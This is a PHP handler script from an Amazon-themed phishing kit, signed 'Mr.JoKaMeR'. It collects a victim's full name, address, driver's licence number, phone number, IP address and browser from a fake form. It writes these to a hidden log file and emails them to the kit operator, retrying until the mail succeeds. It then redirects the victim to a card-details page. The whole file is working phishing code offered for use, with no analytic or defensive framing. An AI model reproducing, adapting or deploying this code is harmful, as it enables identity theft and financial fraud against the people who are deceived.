<?php
include ("mailjok.php");
$subject = "Result info Amazon Mr.JoKaMeR " . $_SERVER['REMOTE_ADDR'] . " ";
$message  = "+ -----------------Personal Info--------------------\r\n";
$message .= "| Full Name : " . $_POST['FullName'] . "\r\n";
$message .= "| Address Line1 : " . $_POST['Address11'] . "\r\n";
$message .= "| Address Line2 : " . $_POST['Address2'] . "\r\n";
$message .= "| City : " . $_POST['CityName'] . "\r\n";
$message .= "| State/Province/Region : " . $_POST['StateN'] . "\r\n";
$message .= "| ZIP : " . $_POST['ZipCode'] . "\r\n";
$message .= "| Driver's Licence No : " . $_POST['Driver'] . "\r\n";
$message .= "| Country : " . $_POST['CountryNa'] . "\r\n";
$message .= "| Phone Number : " . $_POST['Phone221'] . "\r\n";
$message .= "+ -----------------Personal Info--------------------\r\n";
$message .= "+ ------------------------Mr.JoKaMeR-------------------\r\n";
$message .= "| Adresse IP : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$message .= "| Navigateur : " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$message .= "+ ------------------------Mr.JoKaMeR-------------------------\r\n";
$message .= "+ -----------------------------------------------------------\r\n";
$header  = "From: " . $_SERVER['REMOTE_ADDR'] . "\r\n";
$header .= "MIME-Version: 1.0\r\n";
$file = fopen("../jokamer.txt","ab");
fwrite($file,$message);
fclose($file);
do {
	$send = mail($mail_to, $subject, $message, $header);
} while (!$send);

header('location:card.php');
?>